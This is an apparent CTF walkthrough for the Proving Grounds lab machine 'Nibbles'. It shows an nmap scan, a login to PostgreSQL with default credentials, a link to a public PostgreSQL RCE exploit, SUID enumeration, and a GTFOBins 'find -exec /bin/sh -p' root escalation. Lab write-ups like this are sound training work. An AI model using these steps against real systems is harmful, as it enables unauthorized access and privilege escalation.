---
title: "PG Practice: Nibbles"
created: "2024-01-05"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Practice
machine: "Nibbles"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-practice
  - linux
  - ctf
  - oscp
  - suid-exploitation
  - gtfobins-exploit
  - suid-enumeration
related:
  - "[[GTFObins-SUID-Quick-Reference]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Practice: Nibbles

> **Platform:** Proving Grounds Practice | **OS:** Linux | **Date:** 2024-01-05

---

## Quick Summary

**Open Ports:**
- 21/tcp (ftp)
- 22/tcp (ssh)
- 80/tcp (http)
- 5437/tcp (postgresql)
- 21/tcp (ftp)
- 80/tcp (http)
- 5437/tcp (postgresql)

**Key Techniques:**
- SUID Exploitation
- GTFObins Exploit
- SUID Enumeration

**Privilege Escalation Path:**
- SUID → GTFObins
- sudo -l abuse

---

## Full Walkthrough

Proving grounds Practice - Nibbles CTF writeup.

# NMAP

```text
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
```

## 21/tcp   open  ftp        vsftpd 3.0.3

- Anonymous login prohibited.
 - user:system = failed.

- vsftpd v3.0.3 not vulnerable tp RCE.

Moving to next port.

## 80/tcp   open  http       Apache httpd 2.4.38 ((Debian))

Nothing here!

## 5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9

PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit

Connecting postgresql db using default credentials `postgres:postgres`.

```sh
psql -U postgres -h 192.168.156.47 -p 5437
```

### GitHub Exploit

- https://github.com/kashif-23/modified-public-exploits/blob/main/postgresqlversions_9.3-11.7-RCE.py


Initial Foothold obtained.

## Privilege Escalation

Enumerate SUIDs `$ find / -perm -u=s -type f 2>/dev/null`.

```sh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find	#vulnerable to exploit
/usr/bin/sudo
/usr/bin/umount
```

#### GTFO Bins Exploit

```sh
./find . -exec /bin/sh -p \; -quit
```


**Root Obtained**

---

## Technique Links

- [[GTFObins-SUID-Quick-Reference]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
